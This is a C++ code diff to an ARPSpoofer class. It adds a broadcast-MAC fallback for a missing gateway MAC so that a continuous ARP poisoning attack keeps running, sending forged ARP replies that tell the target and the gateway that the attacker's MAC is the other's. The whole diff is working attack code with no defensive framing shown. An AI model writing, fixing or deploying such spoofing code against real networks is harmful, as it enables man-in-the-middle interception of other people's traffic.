@@ -306,11 +306,21 @@ void ARPSpoofer::spoof_task_func(const std::string& target_ip, const std::string
         return;
     }
     
+    // 如果 gateway_mac 为空，尝试获取
+    std::string resolved_gateway_mac = gateway_mac;
+    if (resolved_gateway_mac.empty()) {
+        std::cout << "[ARP Spoofer] Gateway MAC not provided for " << target_ip 
+                  << ", attempting to resolve " << gateway_ip << std::endl;
+        // 这里可以添加ARP解析逻辑，暂时使用空值让系统继续运行
+        // 在实际的ARP欺骗中，可以使用 ff:ff:ff:ff:ff:ff 广播地址
+        resolved_gateway_mac = "ff:ff:ff:ff:ff:ff";
+    }
+    
     std::cout << "[ARP Spoofer] Starting continuous attack on " << target_ip 
               << " (Thread Pool Mode)" << std::endl;
     std::cout << "[ARP Spoofer] Attack params: target=" << target_ip 
               << ", gateway=" << gateway_ip << ", my_mac=" << my_mac 
-              << ", target_mac=" << target_mac << ", gateway_mac=" << gateway_mac 
+              << ", target_mac=" << target_mac << ", gateway_mac=" << resolved_gateway_mac 
               << ", raw_socket=" << raw_socket_ << std::endl;
     
     auto start_time = std::chrono::steady_clock::now();
@@ -338,7 +348,7 @@ void ARPSpoofer::spoof_task_func(const std::string& target_ip, const std::string
         bool success1 = send_arp_packet(gateway_ip, my_mac, target_ip, target_mac, ARPOP_REPLY);
         
         // 2. 告诉网关：目标的MAC是我的MAC  
-        bool success2 = send_arp_packet(target_ip, my_mac, gateway_ip, gateway_mac, ARPOP_REPLY);
+        bool success2 = send_arp_packet(target_ip, my_mac, gateway_ip, resolved_gateway_mac, ARPOP_REPLY);
         
         if (success1 && success2) {
             packets_sent += 2;
